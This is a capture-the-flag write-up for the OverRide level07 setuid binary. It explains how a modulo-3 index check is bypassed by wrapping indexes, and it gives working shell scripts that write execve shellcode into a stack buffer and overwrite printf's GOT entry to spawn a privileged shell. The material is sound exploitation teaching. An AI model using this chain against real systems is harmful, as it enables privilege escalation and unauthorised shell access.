# OverRide (level07)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/users/level07/level07`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level07`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level07`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level07
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 /home/users/level07/level07
```

|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Owned by level08, so it runs with level08's effective uid: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level07
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ⚠️     | Partial. GOT is still writable but harder to reach.
|  Stack Canary   |    ✅     | Major stack buffer overflows are detected.
|       NX        |    ❌     | Stack/Heap are executable. Shellcode injection is possible.
|       PIE       |    ❌     | The code, GOT and PLT sit at fixed addresses.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to an "Improper Validation of Array Index" ([CWE-129](https://cwe.mitre.org/data/definitions/129.html)) vulnerability.

The program loops infinity, prompting for user input, until `"quit"` is passed.

When the `"store"` argument is passed, the program asks for:
- A numeric value *(uint)*.
- An index where to store it *(int or uint)* relative to `unsigned int buffer[100]`.

The index being user-provided, it allows us to write outside of `buffer`'s bounds. But still, some security mecanisms have been implemented:
- It rejects any index that is a multiple of 3 *(which prevents us from storing more than 8 contiguous bytes)*.
- It rejects any value whose most-significant byte is `0xb7` *(per ldd ~/level07: linux-gate.so, libc.so)*.

We are on a 32-bit system, so `storage[index]` resolves to `storage + (index * 4)` *(<=> `storage + (index * 2^2)`)*. But the **modulo 3** doesn't take that `2^2` offset into account. We can take advantage of this by providing a wrapped-around `index`. Shifting an index by `2^30` *(= `2^32` / `2^2`)* keeps the same address, since `2^32` *(= `2^30 * 2^2`)* wraps to 0. Each shift also nudges the index just enough to change whether it's a multiple of 3: any index that was initially triggering the **modulo 3** condition no longer does.

# Exploit

By exploiting the program's weaknesses, we can write almost anywhere in the process's virtual memory, given two conditions:
- Write exactly 4 bytes at a time.
- Any index that is a multiple of 3 must be wrapped around by 2^30 *(= 2^32 / 2^2)*.
Here is a function that'll handle this for us.
```sh
store() (
    hex_address="${1:-0xFFFFFFFF}";
    raw_index="${2:-0}";
    decimal_payload=$(( hex_address ));
    decimal_index=$(( raw_index % 3 == 0 ? raw_index + (1 << 30) : raw_index ));
    printf "store\n%s\n%s\n" "$decimal_payload" "$decimal_index";
)
```

## `buffer`'s address

ASLR being off, `buffer` sits at a predictable spot in stack and won't change between identical calls.  
Environment variables and parameters can trigger an offset. We will avoid that.

`buffer` is the sole argument of `store_number()`.  
Under the 32-bit [**cdecl**](https://en.wikipedia.org/wiki/X86_calling_conventions) function calling convention, arguments are pushed on the stack before the call. After the prologue, `ebp` is the frame base and the first argument sits past the saved `ebp` and the return address, at `$ebp + 8`.

Once inside `store_number()`, we can retrieve `buffer`'s address using gdb in a predictable manner:
```sh
$ printf 'store\n0\n1\n' | gdb -quiet -batch \
    -ex 'set exec-wrapper env -i' \
    -ex 'break store_number' \
    -ex 'run' \
    -ex 'printf "buffer = %#x\n", *(unsigned int *)($ebp + 8)' \
    /home/users/level07/level07 | grep buffer;
# buffer = 0xffffdc94
```

## Control flow Highjack

To hijack execution flow, we have two classic options:
- **Overwrite a [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) entry**: redirect a [libc](https://en.wikipedia.org/wiki/C_standard_library) function called later in the loop *(ex: `printf`, `fgets`, `memcmp`, `memset`)* to an address of our choosing. Each libc function has a PLT stub that links it to the GOT. That stub explicitly states that [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) address, and is visible in [source.asm](source.asm).
- **Overwrite a saved return address**: hijack control flow when a function returns. Harder here, since we first have to locate the return address on the (non-fixed) stack.

Take `printf@plt` as an example: its stub jumps through `*0x804a000`, so `0x804a000` is `printf()`'s GOT slot. By overwriting the address stored there with that of another function *(or our shellcode)* the next `printf()` call jumps to our target instead.
```asm
08048470 <printf@plt>:
 8048470:	ff 25 00 a0 04 08    	jmp    *0x804a000
 8048476:	68 00 00 00 00       	push   $0x0
 804847b:	e9 e0 ff ff ff       	jmp    8048460 <_init+0x34>
```

`buffer[0]` lands exactly on `buffer`'s address (`0xffffdc94`).  
Since the program resolves `buffer + index * 4`, we divide the byte distance by 4 to get the **raw index** needed to overwrite printf's GOT entry: `(printf_got_addr - buffer) / 4` = `(0x804a000 - 0xffffdc94) / 4` = `33632475`.

## Shellcode

We now want to generate our shellcode from our reference [shellcode.asm](./Ressources/data/shellcode.asm): a classic `sys_execve` call spawning a shell inheriting the process's effective UID (EUID). Once built, it comes out **25** bytes long *(assuming the file is kept in sync)*.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/shellcode.asm";
# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
# Format the bytes into a hex-escaped shellcode payload.
$ hex_shellcode=$(hexdump -v -e '"\\" "x" 1/1 "%02x"' "$tmpdir/shellcode.bin");
# \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
# sh's printf can't decode '\xHH', so we count the raw bytes directly.
$ hex_shellcode_byte_length=$(wc -c < "$tmpdir/shellcode.bin");
# 25
```

We now need to split it up into 4-byte words and pad it accordingly *(with 1-byte NOP operations)*.
```sh
hex_shellcode="$(generate_hex_shellcode "./shellcode.asm")";
while [ $(( (${#hex_shellcode} / 4) % 4 )) -ne 0 ]; do
    hex_shellcode="\\x90${hex_shellcode}";
done
shellcode_words=$(printf '%s' "$hex_shellcode" | sed 's/\\x\(..\)\\x\(..\)\\x\(..\)\\x\(..\)/0x\4\3\2\1 /g');
# 0x31909090 0x6e6850c0 0x6868732f 0x69622f2f 0x5350e389 0xd231e189 0x80cd0bb0
```

## Final payload

We write the shellcode at the very start of `buffer`, so that `buffer`'s address doubles as the shellcode's entry point.  
We then point `printf()`'s GOT entry at that same address: on the next `printf()` call, the program's `printf()` call jumps straight into our shellcode instead.

Given the length of our shellcode, we can calculate the relative insertion indexes in the buffer dynamically.  
The insertion index of the `printf` GOT entry override has to be injected strictly as the one calculated before *(`33632475`)*. That value happens to be a multiple of 3, so `store()` transparently wraps it by `2^30` to slip past the **modulo 3** check.

Order matters. We first write the shellcode and, once the whole shellcode is set up, we perform the GOT overwrite, because the very next `printf()` would fire it.

```sh
build_payload() {
    index=0;
    for word in $shellcode_words; do
        store "$word" "$index";
        index=$(( index + 1 ));
    done

    buffer_addr="0xffffdc94";
    printf_got_index="33632475";
    store "$buffer_addr" "$printf_got_index";
}

payload="$(build_payload)";
(printf '%s\n' "$payload"; cat -) | env -i ~/level07;
```

And there we are.
